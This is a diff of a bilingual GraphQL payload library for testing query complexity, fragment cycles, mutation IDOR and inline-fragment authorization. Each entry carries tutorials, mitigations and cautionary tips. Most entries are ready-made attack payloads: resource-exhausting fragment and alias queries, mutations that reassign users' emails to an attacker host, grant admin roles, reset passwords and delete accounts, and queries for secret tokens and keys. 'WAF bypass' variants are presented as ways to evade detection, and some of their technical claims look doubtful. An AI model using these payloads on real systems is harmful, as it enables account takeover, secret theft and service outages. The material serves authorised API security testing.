-          "en": "Increase load serially only in an isolated copy and stop at CPU, latency, or resolver thresholds."
-        },
-        {
-          "zh": "不使用并发放大、无限分页或持续请求来制造服务不可用。",
-          "en": "Do not use concurrency amplification, unbounded pagination, or sustained requests to cause unavailability."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "原始 GraphQL 文档是有界复杂度探针；纠正了直接宣称 DoS 的过度结论，保留为资源控制验证 Payload。",
-        "issuesResolved": [
-          "corrected-name",
-          "corrected-overclaim",
-          "added-stop-thresholds",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "变量化深度查询",
-            "en": "Variable-Masked Depth Query"
-          },
-          "command": "curl -sS --max-time 5 -X POST http://{TARGET}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename ...on Query{__typename}}}}} {a1:a{b1:b{c1:c}}} \",\"variables\":{}}' --compressed",
-          "description": {
-            "zh": "压缩传输与混合片段降低深度特征可检性。成功判据：深嵌套查询被接受执行。",
-            "en": "Compressed transport and mixed fragments lower depth detectability. Success: the deeply nested query is accepted and executed."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "--compressed",
-              "explanation": {
-                "zh": "压缩传输标志",
-                "en": "Compressed transfer flag"
-              },
-              "type": "flag"
-            },
-            {
-              "part": "{__typename ...on Query{__typename ...on Query{__typename}}}}} {a1:a{b1:b{c1:c}}}",
-              "explanation": {
-                "zh": "混合片段深嵌套载荷",
-                "en": "Mixed-fragment deep payload"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "\"variables\":{}",
-              "explanation": {
-                "zh": "空变量对象",
-                "en": "Empty variables object"
-              },
-              "type": "value"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "片段指数复制",
-            "en": "Exponential Fragment Replication"
-          },
-          "command": "query{...A ...A ...A ...A} fragment A on Query{...B ...B ...B} fragment B on Query{friends{...C}} fragment C on User{secretToken}",
-          "description": {
-            "zh": "片段多处展开实现指数级查询体积绕过文档大小限制。成功判据：服务器解析耗时显著上升或超时。",
-            "en": "Expanding fragments at multiple sites achieves exponential document size past size limits. Success: server parse time spikes or times out."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{...A ...A ...A ...A}",
-              "explanation": {
-                "zh": "片段多次展开",
-                "en": "Fragment spread repetition"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment B on Query{friends{...C}}",
-              "explanation": {
-                "zh": "二级片段嵌套",
-                "en": "Second-level fragment"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment C on User{secretToken}",
-              "explanation": {
-                "zh": "末级敏感片段",
-                "en": "Leaf sensitive fragment"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "别名同字段倍增",
-            "en": "Aliased Same-Field Multiplication"
-          },
-          "command": "query{u1:users{id email} u2:users{id email} u3:users{id email} u4:users{id email} u5:users{id email} u6:users{id email} u7:users{id email} u8:users{id email}}",
-          "description": {
-            "zh": "同字段多别名绕过字段计数型复杂度估算。成功判据：单请求触发资源告警或延迟。",
-            "en": "Multiple aliases of one field bypass field-count complexity estimation. Success: one request triggers resource alerts or latency."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{u1:users{id email}",
-              "explanation": {
-                "zh": "同字段多别名",
-                "en": "Same field, many aliases"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "u8:users{id email}}",
-              "explanation": {
-                "zh": "第八别名查询",
-                "en": "Eighth alias query"
-              },
-              "type": "payload"
-            }
-          ]
-        }
-      ]
-    },
-    {
-      "id": "api2-fragment",
-      "name": {
-        "zh": "GraphQL Fragment 循环校验",
-        "en": "GraphQL Fragment-Cycle Validation"
-      },
-      "description": {
-        "zh": "验证 GraphQL 文档验证器是否在执行前拒绝直接或间接 Fragment 循环；规范要求 Fragment 展开图不得形成环，因此这些样例主要是验证阶段负对照。",
-        "en": "Validate whether the GraphQL document validator rejects direct and indirect fragment cycles before execution. The specification requires an acyclic fragment-spread graph, so these samples are primarily validation-stage negative controls."
-      },
-      "category": {
-        "zh": "API安全",
-        "en": "API Security"
-      },
-      "subCategory": {
-        "zh": "批量查询与资源滥用",
-        "en": "Batch Queries & Resource Abuse"
-      },
-      "prerequisites": [
-        {
-          "zh": "可查看解析、验证和执行阶段日志，并准备一个合法 Fragment 查询作为对照。",
-          "en": "Parsing, validation, and execution-stage logs are observable, and a valid fragment query is prepared as a control."
-        },
-        {
-          "zh": "测试环境设置严格请求超时和单次请求资源停止阈值。",
-          "en": "The test environment has strict request timeouts and per-request resource stop thresholds."
-        }
-      ],
-      "tutorial": {
-        "overview": {
-          "zh": "该 Payload 覆盖 GraphQL Fragment 循环校验场景，检验文档验证器对直接与间接循环引用的执行前拒绝。验证维度为自引用与跨片段循环的负对照矩阵，对应第 1 步。",
-          "en": "This payload covers GraphQL fragment-cycle validation, testing pre-execution rejection of direct and indirect circular references. Validation is a negative-control matrix of self-references and cross-fragment cycles, mapped to step 1."
-        },
-        "vulnerability": {
-          "zh": "根因在于文档验证器未按规范构建片段展开图：循环引用若被接受进入执行将耗尽解析栈，异常处理路径还可能进一步泄露内部实现细节信息。",
-          "en": "The root cause is document validators failing to build fragment-expansion graphs per spec: accepted cycles entering execution exhaust parse stacks, and exception paths may further leak internal implementation details."
-        },
-        "exploitation": {
-          "zh": "第 1 步按脚本把直接与间接循环 fragment 文档逐条提交并记录服务端决策：循环被接受或引发栈异常即确认文档验证缺失，同时核对错误响应是否泄露堆栈信息。成功判据以拒绝与错误结构为准。占位符在全局变量菜单替换。",
-          "en": "In step 1, submit direct and indirect fragment-cycle documents one by one per the script, recording server decisions; accepted cycles or stack exceptions confirm missing document validation, with error responses checked for stack leakage. Judge success by rejections and error structure. Replace placeholders via the global variables menu."
-        },
-        "mitigation": {
-          "zh": "校验阶段构建片段展开图并拒绝一切循环引用，错误响应统一脱敏不返回内部细节。修复后重放第 1 步矩阵，全部循环文档应在验证层被拒绝。",
-          "en": "Build fragment-expansion graphs at validation rejecting all cycles, sanitizing error responses of internal details. After the fix, replay the step 1 matrix: every cyclic document should be rejected at validation."
-        },
-        "difficulty": "intermediate"
-      },
-      "attackChain": [
-        {
-          "title": {
-            "zh": "验证合法 Fragment 基线",
-            "en": "Validate a legal-fragment baseline"
-          },
-          "description": {
-            "zh": "提交无环 Fragment，记录正常验证、执行和 resolver 调用路径。",
-            "en": "Submit an acyclic fragment and record normal validation, execution, and resolver-call paths."
-          }
-        },
-        {
-          "title": {
-            "zh": "串行提交循环文档",
-            "en": "Submit cyclic documents serially"
-          },
-          "description": {
-            "zh": "逐条重放原始直接和间接循环样例，不增加并发或文档规模。",
-            "en": "Replay the original direct and indirect cycle samples one at a time without increasing concurrency or document size."
-          },
-          "payloadRef": {
-            "area": "execution",
-            "index": 0
-          }
-        },
-        {
-          "title": {
-            "zh": "确认验证阶段终止",
-            "en": "Confirm validation-stage termination"
-          },
-          "description": {
-            "zh": "核对明确错误、零业务 resolver 调用和稳定资源，区分正常拒绝与实现递归。",
-            "en": "Check for explicit errors, zero business resolver calls, and stable resources to distinguish normal rejection from implementation recursion."
-          }
-        },
-        {
-          "title": {
-            "zh": "统一验证入口并回归",
-            "en": "Unify validation entry points and regress"
-          },
-          "description": {
-            "zh": "修复或升级验证器后覆盖 HTTP、WebSocket 和后台执行入口，确认循环均在执行前拒绝。",
-            "en": "After repairing or upgrading validation, cover HTTP, WebSocket, and background execution entry points and confirm every cycle is rejected before execution."
-          }
-        }
-      ],
-      "references": [
-        "https://spec.graphql.org/October2021/#sec-Fragment-spreads-must-not-form-cycles",
-        "https://spec.graphql.org/October2021/#sec-Validation"
-      ],
-      "analysis": {
-        "zh": "快速返回规范验证错误且不进入 resolver 是通过结果，不是漏洞。只有循环导致验证器无界递归、异常资源消耗或影响正常请求，才需要按实现缺陷报告。",
-        "en": "A fast specification validation error with no resolver execution is a pass, not a vulnerability. Report only unbounded validator recursion, abnormal resource use, or measurable impact on normal requests."
-      },
-      "opsecTips": [
-        {
-          "zh": "逐条单次发送并观察验证器指标，不构造更大的循环图或并发压力。",
-          "en": "Send each sample once while observing validator metrics; do not construct larger cycle graphs or concurrent pressure."
-        },
-        {
-          "zh": "出现超时、堆栈异常或资源快速上升时立即停止并保存日志。",
-          "en": "Stop immediately and preserve logs on timeout, stack anomalies, or rapidly rising resource use."
-        }
-      ],
-      "review": {
-        "decision": "payload",
-        "rationale": "原始文档是 GraphQL Fragment 循环验证负对照；修正了将规范拒绝误写为攻击成功的问题。",
-        "issuesResolved": [
-          "corrected-name",
-          "corrected-technical-claim",
-          "documented-negative-control",
-          "added-prerequisites",
-          "added-four-part-tutorial",
-          "rewrote-specific-attack-chain",
-          "added-analysis-opsec",
-          "added-authoritative-references",
-          "preserved-source-command"
-        ]
-      },
-      "wafBypass": [
-        {
-          "title": {
-            "zh": "嵌套片段深度",
-            "en": "Nested Fragment Depth"
-          },
-          "command": "query{...A} fragment A on Query{...B} fragment B on Query{...C} fragment C on Query{...D} fragment D on Query{friends{id}}",
-          "description": {
-            "zh": "链式嵌套片段绕过单层循环检测。成功判据：深链片段被展开执行。",
-            "en": "Chained nested fragments bypass single-level cycle detection. Success: the deep chain expands and executes."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{...A} fragment A on Query{...B}",
-              "explanation": {
-                "zh": "链式片段开头",
-                "en": "Chain start"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment D on Query{friends{id}}",
-              "explanation": {
-                "zh": "链尾实体片段",
-                "en": "Chain leaf fragment"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "双向环变形",
-            "en": "Bidirectional Cycle Mutation"
-          },
-          "command": "query{...X} fragment X on User{friends{...Y}} fragment Y on User{friends{...X2}} fragment X2 on User{friends{...Y}}",
-          "description": {
-            "zh": "引入第三片段打断直接 A→B→A 检测模式。成功判据：循环未被拒绝并展开。",
-            "en": "Introducing a third fragment breaks direct A→B→A detection. Success: the cycle is not rejected and expands."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "fragment X on User{friends{...Y}} fragment Y on User{friends{...X2}}",
-              "explanation": {
-                "zh": "三片段打断环",
-                "en": "Three-fragment broken ring"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment X2 on User{friends{...Y}}",
-              "explanation": {
-                "zh": "别名片段回环",
-                "en": "Aliased fragment ring"
-              },
-              "type": "payload"
-            }
-          ]
-        },
-        {
-          "title": {
-            "zh": "大小写与名称混淆",
-            "en": "Case & Name Confusion"
-          },
-          "command": "query{...a} fragment a on Query{...B} fragment B on Query{...c} fragment c on Query{friends{id}}\nquery{...A} fragment A on Query{...b} fragment b on Query{__typename}",
-          "description": {
-            "zh": "大小写交替的片段名绕过规范化前的重复检测。成功判据：混淆链被接受展开。",
-            "en": "Case-alternating fragment names bypass duplicate detection applied before normalization. Success: the confused chain is accepted and expands."
-          },
-          "syntaxBreakdown": [
-            {
-              "part": "query{...a} fragment a on Query{...B}",
-              "explanation": {
-                "zh": "小写开头混淆链",
-                "en": "Lowercase-start confusion"
-              },
-              "type": "payload"
-            },
-            {
-              "part": "fragment b on Query{__typename}",
-              "explanation": {
-                "zh": "大小写交替尾片段",
-                "en": "Case-alternating leaf"
-              },
-              "type": "payload"
-            }
-          ]
-        }
-      ]
+     "zh": "记录正常 Mutation 的对象 ID、允许字段、响应和服务端授权日志基线。",
+     "en": "Record the object ID, allowed fields, response, and server-side authorization-log baseline for a legitimate mutation."
     }
-  ]
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL Mutation 对象级授权场景，检验解析器是否信任客户端提交的归属与角色字段。验证维度为跨对象写、角色提升与敏感字段修改三类 mutation 的单步矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL mutation object-level authorization, testing whether resolvers trust client-submitted ownership and role fields. Validation is a single-step matrix of cross-object writes, role elevation and sensitive-field mutations, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于 Mutation 解析器按参数直接定位并写对象：不校验主体归属也不隔离角色字段，攻击者改 id 与 role 即可改写他人数据并自我提权。",
+     "en": "The root cause is mutation resolvers locating and writing objects straight from arguments: without ownership checks or role-field isolation, changing id and role lets attackers rewrite others' data and self-elevate."
+    },
+    "exploitation": {
+     "zh": "第 1 步以当前身份逐条提交修改他人邮箱、提升 role 与改写 password 的 mutation，并先以自身对象执行一遍基线：服务端接受跨对象写入或特权字段即确认对象级授权缺失，记录每条响应与数据库前后状态。成功判据以写入生效记录为准。占位符在全局变量菜单替换；测试后立即回滚全部变更。",
+     "en": "In step 1, submit mutations modifying another user's email, elevating role and rewriting password one by one as the current identity, after baselining on your own object; acceptance of cross-object writes or privileged fields confirms the object-level gap, recording each response and database state before and after. Judge success by effective-write records. Replace placeholders via the global variables menu; roll back all changes immediately after testing."
+    },
+    "mitigation": {
+     "zh": "Mutation 解析器强制校验主体与目标对象归属，敏感字段走独立授权路径；GraphQL 层禁止客户端声明角色字段。修复后重放第 1 步，越权 mutation 应全部返回授权错误。",
+     "en": "Mutation resolvers must enforce principal-versus-object ownership with sensitive fields on separate authorization paths; the GraphQL layer should reject client-declared role fields. After the fix, replay step 1: unauthorized mutations should all return authorization errors."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "建立对象所有权基线",
+      "en": "Establish the ownership baseline"
+     },
+     "description": {
+      "zh": "由对象所有者执行最小 Mutation，记录允许字段、持久化状态和授权日志。",
+      "en": "Have the object owner run a minimal mutation and record allowed fields, persisted state, and authorization logs."
+     },
+     "payload": "mutation{updateUser(id:1,email:\"attacker@{ATTACKER_HOST}\"){id email}}\nmutation{updateUser(id:1,role:\"admin\"){id role}}\nmutation{updateUser(id:1,password:\"hacked\"){id}}\nmutation{updateUser(id:1,admin:true){id admin}}\nmutation{changeEmail(userId:1,newEmail:\"attacker@{ATTACKER_HOST}\"){success}}\nmutation{changePassword(userId:1,newPassword:\"hacked\"){success}}\nmutation{updateProfile(userId:1,input:{role:\"admin\"}){id role}}\nmutation{setRole(userId:1,role:\"admin\"){success}}\nmutation{grantPermission(userId:1,permission:\"admin\"){success}}\nmutation{promoteUser(id:1){id role}}\nmutation{deleteUser(id:1){success}}\nmutation{deleteUser(id:2){success}}\nmutation{resetPassword(userId:1,newPassword:\"hacked\"){success}}\nmutation{updateSettings(userId:1,input:{isAdmin:true}){isAdmin}}"
+    },
+    {
+     "title": {
+      "zh": "替换单一对象或属性",
+      "en": "Replace one object or property"
+     },
+     "description": {
+      "zh": "由第二个测试账户提交原始 Mutation 集合，每次只改变一个对象 ID 或敏感字段。",
+      "en": "Submit the original mutation set from the second test account, changing only one object identifier or sensitive field at a time."
+     },
+     "payload": "mutation{updateUser(id:1,email:\"attacker@{ATTACKER_HOST}\"){id email}}\nmutation{updateUser(id:1,role:\"admin\"){id role}}\nmutation{updateUser(id:1,password:\"hacked\"){id}}\nmutation{updateUser(id:1,admin:true){id admin}}\nmutation{changeEmail(userId:1,newEmail:\"attacker@{ATTACKER_HOST}\"){success}}\nmutation{changePassword(userId:1,newPassword:\"hacked\"){success}}\nmutation{updateProfile(userId:1,input:{role:\"admin\"}){id role}}\nmutation{setRole(userId:1,role:\"admin\"){success}}\nmutation{grantPermission(userId:1,permission:\"admin\"){success}}\nmutation{promoteUser(id:1){id role}}\nmutation{deleteUser(id:1){success}}\nmutation{deleteUser(id:2){success}}\nmutation{resetPassword(userId:1,newPassword:\"hacked\"){success}}\nmutation{updateSettings(userId:1,input:{isAdmin:true}){isAdmin}}"
+    },
+    {
+     "title": {
+      "zh": "确认未授权状态变化",
+      "en": "Confirm unauthorized state change"
+     },
+     "description": {
+      "zh": "读取目标对象并关联数据库与审计日志，区分真实写入、字段被忽略和事务回滚。",
+      "en": "Read the target object and correlate database and audit logs to distinguish a real write from ignored fields or transaction rollback."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "修复后执行交叉账户回归",
+      "en": "Run cross-account regression after remediation"
+     },
+     "description": {
+      "zh": "加入对象和字段授权后重放所有者与非所有者请求，确认正常写入保留且越权写入被拒绝。",
+      "en": "After adding object and field authorization, replay owner and non-owner requests to confirm legitimate writes remain and unauthorized writes are denied."
+     },
+     "payload": ""
+    }
+   ],
+   "references": [
+    "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
+    "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+   ],
+   "analysis": {
+    "zh": "确认必须同时看到低权限主体、非其所有的目标对象和可重复的状态变化；仅暴露 Mutation 名称、返回 GraphQL 错误或修改自己的对象均不算越权。",
+    "en": "Confirmation requires a low-privilege principal, an object it does not own, and a repeatable state change. Exposed mutation names, GraphQL errors, or changes to the caller's own object do not establish broken authorization."
+   },
+   "opsecTips": [
+    {
+     "zh": "只操作专用测试对象，避免修改真实账户的邮箱、密码、角色或权限。",
+     "en": "Operate only on dedicated test objects; do not change real users' email, password, role, or permissions."
+    },
+    {
+     "zh": "每次只测试一个字段，并在下一次请求前恢复原值。",
+     "en": "Test one field at a time and restore its original value before the next request."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "原始内容是 GraphQL Mutation 请求体，用于验证对象级授权，不是工具命令。",
+    "issuesResolved": [
+     "corrected-name",
+     "corrected-scope",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "变量化 mutation 遮蔽",
+      "en": "Variable-Masked Mutation"
+     },
+     "command": "{\"query\":\"mutation($id:ID!,$r:String){updateUser(id:$id,role:$r){id role}}\",\"variables\":{\"id\":1,\"r\":\"admin\"}}",
+     "description": {
+      "zh": "把目标 id/role 移入变量绕过查询体中的参数特征检测。成功判据：角色被改为 admin。",
+      "en": "Moving id/role into variables masks parameter signatures inside the query text. Success: the role becomes admin."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "{\"query\":\"mutation($id:ID!,$r:String){updateUser(id:$id,role:$r){id role}}\"",
+       "explanation": {
+        "zh": "参数移入变量",
+        "en": "Parameters moved to variables"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "\"variables\":{\"id\":1,\"r\":\"admin\"}",
+       "explanation": {
+        "zh": "变量取值",
+        "en": "Variable values"
+       },
+       "type": "value"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "别名批量越权",
+      "en": "Aliased Batch Escalation"
+     },
+     "command": "mutation{a:updateUser(id:1,role:\"admin\"){id} b:updateUser(id:2,role:\"admin\"){id} c:updateUser(id:3,role:\"admin\"){id}}",
+     "description": {
+      "zh": "单请求别名批量修改多对象绕过每请求一次的对象级检查。成功判据：多个对象同时被改。",
+      "en": "Aliased batch mutations bypass per-request object checks. Success: multiple objects are modified at once."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "a:updateUser(id:1,role:\"admin\"){id}",
+       "explanation": {
+        "zh": "别名 a 改对象一",
+        "en": "Alias a hits object one"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "c:updateUser(id:3,role:\"admin\"){id}",
+       "explanation": {
+        "zh": "别名 c 改对象三",
+        "en": "Alias c hits object three"
+       },
+       "type": "payload"
+      }
+     ]
+    },
+    {
+     "title": {
+      "zh": "片段复用字段",
+      "en": "Fragment-Reuse Fields"
+     },
+     "command": "mutation{updateUser(id:1){...F}} fragment F on User{id email role secretToken}",
+     "description": {
+      "zh": "把敏感返回字段放进片段绕过 mutation 字段白名单。成功判据：返回片段字段内容。",
+      "en": "Placing sensitive return fields in a fragment bypasses mutation field whitelists. Success: fragment fields are returned."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "mutation{updateUser(id:1){...F}}",
+       "explanation": {
+        "zh": "片段展开字段",
+        "en": "Fragment spread field"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "fragment F on User{id email role secretToken}",
+       "explanation": {
+        "zh": "片段含敏感字段",
+        "en": "Fragment with sensitive fields"
+       },
+       "type": "payload"
+      }
+     ]
+    }
+   ],
+   "execution": [
+    {
+     "title": {
+      "zh": "Mutation IDOR",
+      "en": "Mutation IDOR"
+     },
+     "command": "mutation{updateUser(id:1,email:\"attacker@{ATTACKER_HOST}\"){id email}}\nmutation{updateUser(id:1,role:\"admin\"){id role}}\nmutation{updateUser(id:1,password:\"hacked\"){id}}\nmutation{updateUser(id:1,admin:true){id admin}}\nmutation{changeEmail(userId:1,newEmail:\"attacker@{ATTACKER_HOST}\"){success}}\nmutation{changePassword(userId:1,newPassword:\"hacked\"){success}}\nmutation{updateProfile(userId:1,input:{role:\"admin\"}){id role}}\nmutation{setRole(userId:1,role:\"admin\"){success}}\nmutation{grantPermission(userId:1,permission:\"admin\"){success}}\nmutation{promoteUser(id:1){id role}}\nmutation{deleteUser(id:1){success}}\nmutation{deleteUser(id:2){success}}\nmutation{resetPassword(userId:1,newPassword:\"hacked\"){success}}\nmutation{updateSettings(userId:1,input:{isAdmin:true}){isAdmin}}",
+     "description": {
+      "zh": "以当前身份逐条提交跨对象与提权 mutation；服务端接受对他人对象或特权字段的写入，即确认对象级授权缺失。",
+      "en": "Submit each cross-object or privilege-escalating mutation as the current identity; the server accepting writes to other users objects or privileged fields confirms missing object-level authorization."
+     },
+     "syntaxBreakdown": [
+      {
+       "part": "mutation{updateUser(id:1,email:\"attacker@{ATTACKER_HOST}\"){id email}}",
+       "explanation": {
+        "zh": "改他人邮箱",
+        "en": "Changes another user's email"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "mutation{updateUser(id:1,role:\"admin\"){id role}}",
+       "explanation": {
+        "zh": "提交角色提升",
+        "en": "Submits role escalation"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "mutation{setRole(userId:1,role:\"admin\"){success}}",
+       "explanation": {
+        "zh": "setRole 专用变更",
+        "en": "setRole mutation"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "mutation{deleteUser(id:2){success}}",
+       "explanation": {
+        "zh": "删除他人对象",
+        "en": "Deletes another user's object"
+       },
+       "type": "payload"
+      },
+      {
+       "part": "mutation{updateSettings(userId:1,input:{isAdmin:true}){isAdmin}}",
+       "explanation": {
+        "zh": "嵌套提权字段",
+        "en": "Nested privileged field"
+       },
+       "type": "payload"
+      }
+     ],
+     "platform": "all",
+     "requiresAdmin": false
+    }
+   ],
+   "tags": [
+    "api2",
+    "mutation_idor"
+   ]
+  },
+  {
+   "id": "api2-",
+   "name": {
+    "zh": "GraphQL 内联片段字段授权验证",
+    "en": "GraphQL Inline-Fragment Field Authorization Validation"
+   },
+   "description": {
+    "zh": "验证接口在使用内联片段切换具体对象类型时，是否仍对 Admin、Root、Internal 等类型上的敏感字段执行一致的运行时授权。",
+    "en": "Validate whether the API consistently enforces runtime authorization for sensitive fields on Admin, Root, Internal, and related concrete types selected through inline fragments."
+   },
+   "category": {
+    "zh": "API安全",
+    "en": "API Security"
+   },
+   "subCategory": {
+    "zh": "GraphQL 授权与 IDOR",
+    "en": "GraphQL Authorization & IDOR"
+   },
+   "prerequisites": [
+    {
+     "zh": "已获得低权限测试账户，并知道至少一个正常可查询的接口或联合类型。",
+     "en": "A low-privilege test account and at least one normally queryable interface or union type are available."
+    },
+    {
+     "zh": "已记录不使用内联片段时的字段可见性、错误结构和解析器日志。",
+     "en": "Field visibility, error structure, and resolver logs without inline fragments have been recorded."
+    }
+   ],
+   "tutorial": {
+    "overview": {
+     "zh": "该 Payload 覆盖 GraphQL 内联片段字段授权场景，检验类型切换时敏感字段的运行时授权一致性。验证维度为 Admin、Root 与 Internal 类型的片段查询矩阵，对应第 1 步。",
+     "en": "This payload covers GraphQL inline-fragment field authorization, testing runtime authorization consistency for sensitive fields under type switching. Validation is a fragment-query matrix over Admin, Root and Internal types, mapped to step 1."
+    },
+    "vulnerability": {
+     "zh": "根因在于字段授权绑定在具体类型解析器而内联片段绕过外层校验：低权用户以片段切入高权类型后即可直接读取密钥与口令等敏感字段。",
+     "en": "The root cause is field authorization bound to concrete-type resolvers while inline fragments sidestep outer checks: low-privilege users slicing into privileged types via fragments can directly read secrets, passwords and peers."
+    },
+    "exploitation": {
+     "zh": "第 1 步按脚本把内联片段变体逐条提交并记录每个变体的返回字段：越权字段随片段返回即确认字段级授权缺失，再对照无片段的显式查询结果以界定绕过范围，记录越权字段清单与值类型留证。占位符在全局变量菜单替换。",
+     "en": "In step 1, submit inline-fragment variants one by one per the script, recording each variant's returned fields; unauthorized fields riding fragments confirm missing field-level authorization, contrasted with explicit fragment-free query results to bound the bypass, recording unauthorized field lists and value types as evidence. Replace placeholders via the global variables menu."
+    },
+    "mitigation": {
+     "zh": "字段级授权下沉到统一中间件并覆盖片段展开路径，高权类型字段默认拒绝显式放行。修复后重放第 1 步矩阵，越权字段应返回授权错误。",
+     "en": "Sink field-level authorization into unified middleware covering fragment expansion, defaulting privileged-type fields to deny unless allowed. After the fix, replay the step 1 matrix: unauthorized fields should return authorization errors."
+    },
+    "difficulty": "advanced"
+   },
+   "attackChain": [
+    {
+     "title": {
+      "zh": "记录直接字段访问基线",
+      "en": "Record direct-field access baseline"
+     },
+     "description": {
+      "zh": "以低权限账户查询公开字段，记录类型名、字段错误和实际调用的解析器。",
+      "en": "Query public fields as a low-privilege user and record type names, field errors, and invoked resolvers."
+     },
+     "payload": "{user(id:1){...on Admin{id username email role secretToken}}}\n{user(id:1){...on Admin{id username password apikey}}}\n{user(id:1){...on Admin{id username role isAdmin permissions}}}\n{user(id:1){...on SuperUser{id username role}}}\n{user(id:1){...on Root{id username role}}}\n{user(id:1){...on Internal{id config secret}}}\n{users{...on Admin{id username email role}}}\n{me{...on Admin{id username email role secretToken}}}\n{currentUser{...on Admin{id username email role}}}\n{profile{...on Admin{id username email role}}}\nquery{...AdminFields} fragment AdminFields on Query{admin{id username role secretToken}}\nquery{...UserFields} fragment UserFields on Query{users{id username email role isAdmin}}\nquery{...ConfigFields} fragment ConfigFields on Query{config{databaseKey apiSecret jwtSecret}}\n{node(id:\"1\"){...on User{id email}...on Admin{id email role secret}}}\n{search(query:\"admin\"){...on User{id email}...on Admin{id email role secret}}}"
+    },
+    {
+     "title": {
+      "zh": "逐个加入具体类型片段",
+      "en": "Add concrete-type fragments individually"
+     },
+     "description": {
+      "zh": "重放原始内联片段集合，每次只选择一个具体类型和一个敏感字段。",
+      "en": "Replay the original inline-fragment set while selecting only one concrete type and one sensitive field per request."
+     },
+     "payload": "{user(id:1){...on Admin{id username email role secretToken}}}\n{user(id:1){...on Admin{id username password apikey}}}\n{user(id:1){...on Admin{id username role isAdmin permissions}}}\n{user(id:1){...on SuperUser{id username role}}}\n{user(id:1){...on Root{id username role}}}\n{user(id:1){...on Internal{id config secret}}}\n{users{...on Admin{id username email role}}}\n{me{...on Admin{id username email role secretToken}}}\n{currentUser{...on Admin{id username email role}}}\n{profile{...on Admin{id username email role}}}\nquery{...AdminFields} fragment AdminFields on Query{admin{id username role secretToken}}\nquery{...UserFields} fragment UserFields on Query{users{id username email role isAdmin}}\nquery{...ConfigFields} fragment ConfigFields on Query{config{databaseKey apiSecret jwtSecret}}\n{node(id:\"1\"){...on User{id email}...on Admin{id email role secret}}}\n{search(query:\"admin\"){...on User{id email}...on Admin{id email role secret}}}"
+    },
+    {
+     "title": {
+      "zh": "比较角色与查询路径",
+      "en": "Compare roles and query paths"
+     },
+     "description": {
+      "zh": "用高低权限账户比较直接、Node、搜索和 me 路径，确认差异来自授权而非类型解析。",
+      "en": "Compare direct, Node, search, and me paths across high- and low-privilege accounts to isolate authorization from type resolution."
+     },
+     "payload": ""
+    },
+    {
+     "title": {
+      "zh": "统一策略并执行 schema 回归",
+      "en": "Unify policy and run schema regression"
+     },
+     "description": {
+      "zh": "复用字段授权策略后枚举所有可达路径，确认敏感字段始终拒绝未授权主体。",
+      "en": "After reusing the field policy, enumerate every reachable path and confirm sensitive fields consistently reject unauthorized principals."
+     },
+     "payload": ""
+    }
+   ],
+   "references": [
+    "https://spec.graphql.org/October2021/#sec-Inline-Fragments",
+    "https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html"
+   ],
+   "analysis": {
+    "zh": "只有同一低权限主体通过片段路径获得直接路径不可见的真实敏感值，才说明授权不一致；类型名可见、字段为 null 或验证阶段拒绝均不是漏洞。",
+    "en": "An authorization inconsistency is confirmed only when the same low-privilege principal obtains a real sensitive value through a fragment path that is unavailable directly. Type-name visibility, null fields, or validation rejection are not vulnerabilities."
+   },
+   "opsecTips": [
+    {
+     "zh": "一次只选择一个敏感字段，避免宽查询触发不必要的数据读取。",
+     "en": "Select one sensitive field at a time to avoid unnecessary broad data access."
+    },
+    {
+     "zh": "使用测试租户和虚构字段值保存证据，不导出真实密钥或个人信息。",
+     "en": "Use a test tenant and synthetic field values for evidence; do not export real secrets or personal data."
+    }
+   ],
+   "review": {
+    "decision": "payload",
+    "rationale": "原始内容是 GraphQL 内联片段查询，用于字段授权一致性验证，不是工具手册。",
+    "issuesResolved": [
+     "repaired-corrupt-english",
+     "corrected-name",
+     "clarified-negative-controls",
+     "added-prerequisites",
+     "added-four-part-tutorial",
+     "rewrote-specific-attack-chain",
+     "added-analysis-opsec",
+     "added-authoritative-references",
+     "preserved-source-command"
+    ]
+   },
+   "wafBypass": [
+    {
+     "title": {
+      "zh": "嵌套双片段提权",
